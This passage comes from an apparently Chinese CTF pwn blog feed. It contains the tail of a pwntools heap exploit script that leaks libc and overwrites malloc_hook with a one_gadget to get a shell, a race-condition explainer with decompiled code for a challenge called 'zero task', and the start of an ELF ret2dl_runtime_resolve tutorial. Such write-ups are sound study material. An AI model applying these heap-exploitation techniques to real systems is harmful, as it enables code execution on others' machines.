class="line">sh.sendlineafter(&apos;Content: &apos;,con)</span><br><span class="line">def delete(idx):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def shrink(size,cnt):</span><br><span class="line">        for i in xrange(cnt):</span><br><span class="line">            allocate(size)</span><br><span class="line">            update(i,size,&apos;x&apos;*size)</span><br><span class="line"></span><br><span class="line">        for i in xrange(cnt):</span><br><span class="line">            delete(i)</span><br><span class="line"></span><br><span class="line">shrink(0x28,7)</span><br><span class="line">shrink(0x48,7)</span><br><span class="line">shrink(0x28,15)  #--&gt; which will be consolidate to unsorted bin</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">for i in range(7):  # 0-6</span><br><span class="line">    allocate(0x18)</span><br><span class="line">    update(i,0x17,&apos;1&apos;*0x17)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38)     #7    # fastbins to unsorted bins and allocate from it;  malloc_consolidate won&apos;t consolidate tcache bins;</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">update(7,0x38,&apos;2&apos;*0x38)  #shrink topchunk to 0x200</span><br><span class="line"></span><br><span class="line">allocate(0x18)     #8</span><br><span class="line">allocate(0x18)     #9</span><br><span class="line">for i in range(10,15): # 10 - 14</span><br><span class="line">    allocate(0x48)</span><br><span class="line">    update(i,0x47,&apos;2&apos;*0x47)</span><br><span class="line">for i in range(1,7):  #1-6</span><br><span class="line">    delete(i)  </span><br><span class="line">delete(9)  #0x18</span><br><span class="line">delete(0)  #0x18</span><br><span class="line">delete(8)  #0x18</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38) #0   # consolidate again            !!!!!!!!! 因为此处之前的unsortedbin被shrink了，所以后面对unsorted bin的操作无法更新chunk 0的pre_size 位，造成在这次consolidate 的时候chunk 0尝试向后合并是根据自己没有更新成功的pre_size来合并的，所以出书先overflapping,从而可以泄露libc信息</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show(10)</span><br><span class="line">sh.recvuntil(&apos;: &apos;)</span><br><span class="line">leak_addr = u64(sh.recv(8))</span><br><span class="line">print hex(leak_addr)</span><br><span class="line">libc.address = leak_addr- 0x3ebca0</span><br><span class="line">print hex(libc.address)</span><br><span class="line">main_arena = libc.address+ 0x3ebc40</span><br><span class="line">print hex(main_arena)</span><br><span class="line">one_gadget = libc.address+ 0x4f322</span><br><span class="line">print hex(one_gadget)</span><br><span class="line">#------------------------------------------</span><br><span class="line"></span><br><span class="line">for i in range(1,4):  # 1 - 3</span><br><span class="line">    allocate(0x48)</span><br><span class="line">    update(i,0x47,&apos;3&apos;*0x47)</span><br><span class="line"></span><br><span class="line">allocate(0x58) # 4</span><br><span class="line">allocate(0x28) # 5                 // put chunk5&apos;s address  in the fastbins[0x30];</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">delete(5)</span><br><span class="line">allocate(0x58) # 5</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">update(5,0x48,&apos;\x00&apos;*0x38+p64(0x31)+p64(0x51))  # fake fd to fastbin</span><br><span class="line">allocate(0x28)</span><br><span class="line">update(6,0x20,&apos;\x00&apos;*0x18+p64(0x21))</span><br><span class="line">delete(1)</span><br><span class="line">update(10,0x8,p64(main_arena+0x10))</span><br><span class="line">allocate(0x48)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x48)</span><br><span class="line">update(8,0x48,&apos;\x00&apos;*0x40+p64(main_arena-0x38))  # edit topchunk upon malloc_hook</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x58)</span><br><span class="line">#print hex(libc.symbols[&apos;&apos;])</span><br><span class="line">update(9,0x20,&apos;\x00&apos;*0x10+p64(one_gadget)+p64(libc.symbols[&apos;svc_run&apos;]+0x42))</span><br><span class="line">allocate(0x58)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><em>整个过程特别复杂，尤其是看不到指针的情况下，与2018一样需要慢慢捋，最好在纸上记录chunk地址与idx；</em><br><em>堆的一些地方还是有盲区，理解不够细致</em></p><h1 id="zero-task"><a href="#zero-task" class="headerlink" title="zero task"></a>zero task</h1><p><em>这个是被做出来最多的pwn，条件竞争类型的，之前没有接触过，当时看到跑线程想到可能是这个，但是没去现学，不过还是得继续。</em></p><h2 id="race-condition"><a href="#race-condition" class="headerlink" title="race condition"></a>race condition</h2><p>竞争条件是系统中的一种反常现象，由于现代Linux系统中大量使用并发编程，对资源进行共享，如果产生错误的访问模式，便可能产生内存泄露，系统崩溃，数据破坏，甚至安全问题。竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。一个看起来无害的程序如果被恶意攻击者利用，将发生竞争条件漏洞。</p><p>代码说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//myThreadTest</span><br><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;pthread.h&gt;  </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int i = 1;  </span><br><span class="line">void *mythread1()  </span><br><span class="line">&#123;   </span><br><span class="line">    if(i == 1)&#123;</span><br><span class="line">    sleep(3);</span><br><span class="line">    if(i == 2)             </span><br><span class="line">    printf(&quot;hack it!\n&quot;);</span><br><span class="line">    else</span><br><span class="line">    printf(&quot;you can try again!\n&quot;);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">void *mythread2()  </span><br><span class="line">&#123;  </span><br><span class="line">    sleep(1);</span><br><span class="line">    i=2;      </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">int main(int argc, const char *argv[])  </span><br><span class="line">&#123;    </span><br><span class="line">    pthread_t id1,id2;  </span><br><span class="line">  </span><br><span class="line">    pthread_create(&amp;id1, NULL, (void *)mythread1,NULL);  </span><br><span class="line">    pthread_create(&amp;id2, NULL, (void *)mythread2,NULL);  </span><br><span class="line">     </span><br><span class="line">    pthread_join(id1,NULL);  </span><br><span class="line">    pthread_join(id2,NULL);  </span><br><span class="line">  </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o test  -lpthread        // linux 默认库不包含pthread，所以编译时需要添加lpthread</span><br><span class="line"></span><br><span class="line">$ ./test </span><br><span class="line">hack it!</span><br></pre></td></tr></table></figure><p>这个例子比较简单，但是很清晰，可以说是两个并发流同时访问了对象i ，在线程一还未结束时（sleep(3)），线程三同时访问对象i并修改了i的值从而影响了线程一。</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>三个功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1. Add task&quot;);</span><br><span class="line">  puts(&quot;2. Delete task&quot;);</span><br><span class="line">  puts(&quot;3. Go&quot;);</span><br><span class="line">  return printf(&quot;Choice: &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>add 功能： 先输入task id 与 加解密选择，然后malloc(0x70)的空间存放数据；之后进入加解密函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Task id : &quot;, 0LL);</span><br><span class="line">idx = get_num();</span><br><span class="line">printf(&quot;Encrypt(1) / Decrypt(2): &quot;);</span><br><span class="line">method = get_num();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">signed __int64 __fastcall enc_dec(int method, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rsi</span><br><span class="line">  task *v4; // [rsp+0h] [rbp-30h]</span><br><span class="line">  __int64 v5; // [rsp+14h] [rbp-1Ch]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Key : &quot;, a2);</span><br><span class="line">  get_str2((__int64)v4-&gt;key, 32);</span><br><span class="line">  printf(&quot;IV : &quot;, 32LL);</span><br><span class="line">  get_str2((__int64)&amp;v4-&gt;IV, 16);</span><br><span class="line">  printf(&quot;Data Size : &quot;, 16LL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v5 = (unsigned int)get_num();</span><br><span class="line">  if ( (signed int)v5 &lt;= 0 || (signed int)v5 &gt; 0x1000 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *(_QWORD *)&amp;v4-&gt;size = (signed int)v5;</span><br><span class="line">  *(_QWORD *)&amp;v4[1].key[8] = EVP_CIPHER_CTX_new();</span><br><span class="line"></span><br><span class="line">  if ( method == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = EVP_aes_256_cbc();</span><br><span class="line">    EVP_EncryptInit_ex(*(_QWORD *)&amp;v4[1].key[8], v3, 0LL, (__int64)v4-&gt;key, (__int64)&amp;v4-&gt;IV);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( method != 2 )</span><br><span class="line">      return 0LL;</span><br><span class="line">    v3 = EVP_aes_256_cbc();</span><br><span class="line">    EVP_DecryptInit_ex(*(_QWORD *)&amp;v4[1].key[8], v3, 0LL, v4-&gt;key, &amp;v4-&gt;IV);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v4-&gt;method = method;</span><br><span class="line">  v4-&gt;ptr = (__int64)malloc(*(_QWORD *)&amp;v4-&gt;size);                                         </span><br><span class="line">  if ( !v4-&gt;ptr )</span><br><span class="line">    exit(1);</span><br><span class="line">  printf(&quot;Data : &quot;, v3);</span><br><span class="line">  get_str2(v4-&gt;ptr, *(_QWORD *)&amp;v4-&gt;size);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数就是对id还有一点数据检验之后将之前申请的chunk free</p><p>go函数 通过一点检查，之后创建线程将之前的输入的task 跑起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Task id : &quot;);</span><br><span class="line"> v1 = get_num();</span><br><span class="line"> for ( arg = (void *)str; arg; arg = (void *)*((_QWORD *)arg + 13) )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( v1 == *((_DWORD *)arg + 0x18) )</span><br><span class="line">   &#123;</span><br><span class="line">     pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, arg);</span><br><span class="line">     return __readfsqword(0x28u) ^ v4;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>重点的start routine函数,开始便sleep(2)，算是比较明显的条件竞争漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn start_routine(void *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+14h] [rbp-2Ch]</span><br><span class="line">  __int128 v2; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v3; // [rsp+28h] [rbp-18h]</span><br><span class="line">  __int64 v4; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v2 = (unsigned __int64)a1;</span><br><span class="line">  v1 = 0;</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  v4 = 0LL;</span><br><span class="line">  puts(&quot;Prepare...&quot;);</span><br><span class="line">  sleep(2u);</span><br><span class="line">  memset(ptr_0, 0, 0x1010uLL);</span><br><span class="line">  if ( !(unsigned int)EVP_CipherUpdate(</span><br><span class="line">                        *(_QWORD *)(v2 + 88),</span><br><span class="line">                        ptr_0,</span><br><span class="line">                        &amp;v1,</span><br><span class="line">                        *(_QWORD *)v2,</span><br><span class="line">                        (unsigned int)*(_QWORD *)(v2 + 8)) )</span><br><span class="line">    pthread_exit(0LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + 1) += v1;</span><br><span class="line">  if ( !(unsigned int)EVP_CipherFinal_ex(*(_QWORD *)(v2 + 88), (char *)ptr_0 + *((_QWORD *)&amp;v2 + 1), &amp;v1) )</span><br><span class="line">    pthread_exit(0LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + 1) += v1;</span><br><span class="line">  puts(&quot;Ciphertext: &quot;);</span><br><span class="line">  sub_107B(stdout, (__int64)ptr_0, *((unsigned __int64 *)&amp;v2 + 1), 0x10uLL, 1uLL);</span><br><span class="line">  pthread_exit(0LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>知道条件竞争漏洞的存在，可以利用其泄露地址；虽然是存在加解密过程，但是因为知道是AES_256_CBC 加密，同时python具有这个加密模块，所以这个可以解决</p><p>同时还需要的是写地址，在申请add task时 ，每个task 会得到四个chunk 第一个和第四个分别是结构体的存储与data的存储；<br>第二三个结构体是加解密申请的结构体，大小分别为0xb0 与 0x110，其中有存放指针，key， 加密后的data；</p><p>通过伪造加解密的结构及利用tcache的特点将chunk分配到malloc_hook并写入one_gadget；</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn1.4--ret2dl_runtime_resolve</title>
      <link href="/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/"/>
      <url>/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/</url>
      <content type="html"><![CDATA[<h1 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h1><p>ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。</p><p>如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ readelf -d bof</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048358</span><br><span class="line"> 0x0000000d (FINI)                       0x8048624</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x8048278</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481d8</span><br><span class="line"> 0x0000000a (STRSZ)                      107 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   40 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048330</span><br><span class="line"> 0x00000011 (REL)                        0x8048318</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482f8</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482e4</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><p>节中包含目标文件的所有信息。节的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Word sh_name;      // 节头部字符串表节区的索引</span><br><span class="line">    Elf32_Word sh_type;      // 节类型</span><br><span class="line">    Elf32_Word sh_flags;     // 节标志，用于描述属性</span><br><span class="line">    Elf32_Addr sh_addr;      // 节的内存映像</span><br><span class="line">    Elf32_Off  sh_offset;    // 节的文件偏移</span><br><span class="line">    Elf32_Word sh_size;      // 节的长度</span><br><span class="line">    Elf32_Word sh_link;      // 节头部表索引链接</span><br><span class="line">    Elf32_Word sh_info;      // 附加信息</span><br><span class="line">    Elf32_Word sh_addralign; // 节对齐约束</span><br><span class="line">    Elf32_Word sh_entsize;   // 固定大小的节表项的长度</span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ readelf -S bof</span><br><span class="line">There are 31 section headers, starting at offset 0x18a4:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        080483f0 0003f0 000232 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048624 000624 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048638 000638 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048640 000640 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048674 000674 0000f4 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32</span><br><span class="line">  [27] .comment          PROGBITS        00000000 001028 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 001798 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001060 0004b0 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 001510 000288 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>几个重要的节：</p><ol><li>.rel.plt节是用于函数重定位，.rel.dyn节是用于变量重定位</li></ol><p>ida 观察如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048318 ; ELF REL Relocation Table /r_offset r_info</span><br><span class="line">LOAD:08048318                 Elf32_Rel &lt;8049FFCh,  306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048320                 Elf32_Rel &lt;804A040h,  905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048328                 Elf32_Rel &lt;804A044h,  705h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:08048330 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048330                 Elf32_Rel &lt;804A00Ch,  107h&gt; ; R_386_JMP_SLOT setbuf</span><br><span class="line">LOAD:08048338                 Elf32_Rel &lt;804A010h,  207h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:08048340                 Elf32_Rel &lt;804A014h,  407h&gt; ; R_386_JMP_SLOT strlen</span><br><span class="line">LOAD:08048348                 Elf32_Rel &lt;804A018h,  507h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048350                 Elf32_Rel &lt;804A01Ch,  607h&gt; ; R_386_JMP_SLOT write</span><br></pre></td></tr></table></figure><ol start="2"><li>.got节保存全局变量偏移表，.got.plt节保存全局函数偏移表。.got.plt对应着Elf32_Rel结构中r_offset的值。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048380↑r</span><br><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048380+6↑r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset setbuf        ; DATA XREF: _setbuf↑r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset strlen        ; DATA XREF: _strlen↑r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A018                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0804A01C _got_plt        ends</span><br></pre></td></tr></table></figure><ol start="3"><li>.dynsym节包含了动态链接符号表。Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel-&gt;r_info)。</li></ol><p>而根据定义有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span 